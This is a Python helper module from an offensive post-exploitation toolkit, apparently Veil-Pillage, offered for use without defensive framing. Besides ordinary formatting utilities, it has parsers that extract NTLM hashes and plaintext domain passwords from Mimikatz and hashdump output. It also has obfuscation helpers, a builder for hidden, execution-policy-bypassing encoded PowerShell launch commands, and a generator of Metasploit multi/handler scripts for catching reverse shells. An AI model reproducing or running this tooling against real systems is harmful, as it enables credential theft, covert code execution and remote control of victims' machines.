"""

Reusable helpers that don't quite fit anywhere else.

"""

import zlib, re, textwrap, commands, datetime, time
import random, string, string, base64, os

import settings

###############################################################
#
# Validation methods
#
###############################################################

def validHostname(hostname):
    """
    Tries to validate a hostname.
    """
    if len(hostname) > 255: return False
    if hostname[-1:] == ".": hostname = hostname[:-1]
    allowed = re.compile("(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(x) for x in hostname.split("."))


def validIP(IP):
    """
    Tries to validate an IP.
    """
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', IP):
        return True
    else:
        return False


###############################################################
#
# Parsers
#
###############################################################

def parseMimikatz(data):
    """
    Parse Mimikatz 2.0 output and return 4 lists:
        msv1_0, kerberos, wdigest, and tspkg results found
    """

    msv,tspkg,wdigest,kerberos = [],[],[],[]

    # First, extract all msv ntlm hashes
    p = re.compile('(?s)(?<=msv :).*?(?=tspkg :)')
    msvMatches = [m for m in p.findall(data) if "Domain" in m]

    for match in msvMatches:
        
        msv_username,msv_domain,msv_ntlm = None,None,None

        for line in match.split("\n"):
            if "Username" in line:
                t = line.split(":")[1].strip()
                if not t.endswith("$"):
                    msv_username = line.split(":")[1].strip()
            if "Domain" in line:
                msv_domain = line.split(":")[1].strip()
            if "NTLM" in line and (msv_ntlm != ""):
                msv_ntlm = line.split(":")[1].strip()

            if msv_username and msv_domain and msv_ntlm and len(msv_ntlm) == 32:
                msv.append(msv_domain+"/"+msv_username+":"+msv_ntlm)

    # Then extract all the tspkg plaintexts
    p = re.compile('(?s)(?<=tspkg :).*?(?=wdigest :)')
    tspkgMatches = [m for m in p.findall(data) if "Domain" in m]

    for match in tspkgMatches:

        tspkg_username,tspkg_domain,tspkg_password = None,None,None

        for line in match.split("\n"):
            if "Username" in line:
                t = line.split(":")[1].strip()
                if not t.endswith("$"):
                    tspkg_username = line.split(":")[1].strip()

            if "Domain" in line:
                tspkg_domain = line.split(":")[1].strip()
            if "Password" in line:
                tspkg_password = line.split(":")[1].strip()

            if tspkg_username and tspkg_domain and tspkg_password and tspkg_password != "(null)" and len(tspkg_password)<66:
                tspkg.append(tspkg_domain+"/"+tspkg_username+":"+tspkg_password)


    # Then extract all the wdigest plaintexts
    p = re.compile('(?s)(?<=wdigest :).*?(?=kerberos :)')
    wdigestMatches = [m for m in p.findall(data) if "Domain" in m]

    for match in wdigestMatches:

        wdigest_username,wdigest_domain,wdigest_password = None,None,None

        for line in match.split("\n"):
            if "Username" in line:
                t = line.split(":")[1].strip()
                if not t.endswith("$"):
                    wdigest_username = line.split(":")[1].strip()
            if "Domain" in line:
                wdigest_domain = line.split(":")[1].strip()
            if "Password" in line:
                wdigest_password = line.split(":")[1].strip()

            if wdigest_username and wdigest_domain and wdigest_password and wdigest_password != "(null)" and len(wdigest_password)<66:
                wdigest.append(wdigest_domain+"/"+wdigest_username+":"+wdigest_password)

    # Finally extract all the wdigest plaintexts
    p = re.compile('(?s)(?<=kerberos :).*?(?=ssp :)')
    kerberosMatches = [m for m in p.findall(data) if "Domain" in m]

    for match in kerberosMatches:

        kerberos_username,kerberos_domain,kerberos_password = None,None,None

        for line in match.split("\n"):
            if "Username" in line:
                t = line.split(":")[1].strip()
                if not t.endswith("$"):
                    kerberos_username = line.split(":")[1].strip()
            if "Domain" in line:
                kerberos_domain = line.split(":")[1].strip()
            if "Password" in line:
                kerberos_password = line.split(":")[1].strip()

            if kerberos_username and kerberos_domain and kerberos_password and kerberos_password != "(null)" and len(kerberos_password)<66:
                kerberos.append(kerberos_domain+"/"+kerberos_username+":"+kerberos_password)

    # sort/uniquify everything
    msv = sorted(set(msv))
    tspkg = sorted(set(tspkg))
    wdigest = sorted(set(wdigest))
    kerberos = sorted(set(kerberos))

    return (msv, tspkg, wdigest, kerberos)


def parseHashdump(data):
    """
    Parse hashdump output and return a unique set of hashes.
    """

    allhashes = []
    
    pieces = data.split("\r\n\r\n")

    if len(pieces) > 0:

        if ":::" in pieces[0]:
            # standarize the output
            hashes = pieces[0].replace("\r\n","").split(":::")
            hashes = [h for h in hashes if h != ''] 

            # filter out the guest account
            hashes = [h+":::" for h in hashes if ":501:" not in h]

            # add these new hashes to the master set
            allhashes.extend(hashes)
            
            # uniquify everything
            allhashes = sorted(set(allhashes))

    return allhashes


####################################################################################
#
# Randomizers/obfuscators
#
####################################################################################

def randomString(length=-1):
    """
    Returns a random string of "length" characters.
    If no length is specified, resulting string is in between 6 and 15 characters.
    """
    if length == -1: length = random.randrange(6,16)
    random_string = ''.join(random.choice(string.ascii_letters) for x in range(length))
    return random_string


def obfuscateNum(N, mod):
    """
    Take a number and modulus and return an obsucfated form.

    Returns a string of the obfuscated number N
    """
    d = random.randint(1, mod)
    left = int(N/d)
    right = d
    remainder = N % d
    return "(%s*%s+%s)" %(left, right, remainder)


###############################################################
#
# Miscellaneous methods (formatting, sorting, etc.)
#
###############################################################

def updateActivityLog(data):

    # the global activity log file location
    activityFile = settings.PILLAGE_OUTPUT_PATH + "/activity.log"
    timestamp = datetime.datetime.fromtimestamp(time.time()).strftime('%m.%d.%Y-%H:%M:%S')
    
    # write everything out with a timestamp
    f = open(activityFile, 'a')
    f.write(timestamp + ": " + data)
    f.close()


def updateCleanupLog(data):

    # the global activity log file location
    cleanupFile = settings.PILLAGE_OUTPUT_PATH + "/cleanup.pc"

    # write everything out with a timestamp
    f = open(cleanupFile, 'a')
    f.write(data)
    f.close()


def saveModuleFile(module, target, fileName, data):
    """
    Called by a particular module, save 'data' to 
        PILLAGE_OUTPUT_PATH/module_name/TARGET/[timestamp]fileName
    """

    timestamp = datetime.datetime.fromtimestamp(time.time()).strftime('%m.%d.%Y.%H%M%S')

    # format is PILLAGE_OUTPUT_PATH/module_name/target/fileName
    saveFolder = settings.PILLAGE_OUTPUT_PATH + module.__module__ + "/"+target+"/"

    # make the save folder if it doesn't exist already
    if not os.path.exists(saveFolder): os.makedirs(saveFolder)

    finalName = saveFolder+timestamp+"."+fileName

    f = open(finalName, 'w')
    f.write(data)
    f.close()

    return finalName


def encPowershell(cmd,noArch=False):
    """
    Take a powershell command, encode it properly with base64 and build
    the architecture-independent launcher command.

    noArch - don't do the architecture-independent launcher
    """
    # encode the download cradle, weird unicode escaping shit
    encCMD = base64.b64encode("".join([char + "\x00" for char in unicode(cmd)]))
    
    triggerCMD = ""

    # if we don't want the arch-independent launcher
    if (noArch):
        triggerCMD = "call powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " + encCMD
    else:
        # get the correct powershell path and set it temporarily to %pspath%
        triggerCMD = "if %PROCESSOR_ARCHITECTURE%==x86 (set pspath='') else (set pspath=%WinDir%\\syswow64\\windowspowershell\\v1.0\\)&"
        # invoke powershell with the appropriate options
        triggerCMD += "call %pspath%powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " + encCMD

    return triggerCMD


def lhost():
    """
    Return the local IP.
    """
    return commands.getoutput("/sbin/ifconfig").split("\n")[1].split()[1][5:]


def color(string, status=True, warning=False, bold=True):
    """
    Change text color for the linux terminal, defaults to green.
    
    Set "warning=True" for red - TODO: change this?
    """
    attr = []
    if status:
        # green
        attr.append('32')
    if warning:
        # red
        attr.append('31')
    if bold:
        attr.append('1')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)


def formatLong(title, message, frontTab=True, spacing=16):
    """
    Print a long title:message with our standardized formatting.
    Wraps multiple lines into a nice paragraph format.

    Whether a front-tab is displayed is controlled by 'frontTab'
    """

    lines = textwrap.wrap(textwrap.dedent(message).strip(), width=50)
    returnString = ""

    i = 1
    if len(lines) > 0:
        if frontTab:
            returnString += "\t%s%s" % (('{0: <%s}'%spacing).format(title), lines[0])
        else:
            returnString += " %s%s" % (('{0: <%s}'%(spacing-1)).format(title), lines[0])
    while i < len(lines):
        if frontTab:
            returnString += "\n\t"+' '*spacing+lines[i]
        else:
            returnString += "\n"+' '*spacing+lines[i]
        i += 1
    return returnString


def formatDesc(desc):
    """
    Print a option description message in a nicely 
    wrapped and formatted paragraph.
    """
    lines = textwrap.wrap(textwrap.dedent(desc).strip(), width=33)

    returnString = lines[0]
    i = 1
    while i < len(lines):
        returnString += "\n"+' '*40+lines[i]
        i += 1
    return returnString


def sortIPs(ips):
    """
    Sorts a list of IPs in place.

    TODO: check if list is all IPs, if not then don't sort

    Taken from http://www.secnetix.de/olli/Python/tricks.hawk#sortips
    """
    for i in range(len(ips)):
        ips[i] = "%3s.%3s.%3s.%3s" % tuple(ips[i].split("."))
    ips.sort()
    for i in range(len(ips)):
        ips[i] = ips[i].replace(" ", "")


def shellcodeToHandler(shellcode):
    """
    Take a Veil-Evasion shellcode object, extract out options and build
    a handler script if possible.

    Handler script is written to '/tmp/handler.rc', overwriting what's there.
    """

    handler = ""

    # if custom shellcode was generated, can't do anything
    if shellcode.customshellcode != "":
        return handler
    else:
        # if the shellcode wasn't custom, build out a handler script
        handler = "use exploit/multi/handler\n"
        handler += "set PAYLOAD " + shellcode.msfvenompayload + "\n"

        # extract LHOST if it's there
        p = re.compile('LHOST=(.*?) ')
        parts = p.findall(shellcode.msfvenomCommand)
        if len(parts) > 0:
            handler += "set LHOST " + parts[0] + "\n"
        else:
            # try to extract this local IP
            handler += "set LHOST " + lhost() + "\n"
        
        # extract LPORT if it's there
        p = re.compile('LPORT=(.*?) ')
        parts = p.findall(shellcode.msfvenomCommand)
        if len(parts) > 0:
            handler += "set LPORT " + parts[0] + "\n"

        handler += "set ExitOnSession false\n"
        # handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
        handler += "exploit -j\n" 

        f = open("/tmp/handler.rc", 'w')
        f.write(handler)
        f.close()

        return "/tmp/handler.rc"

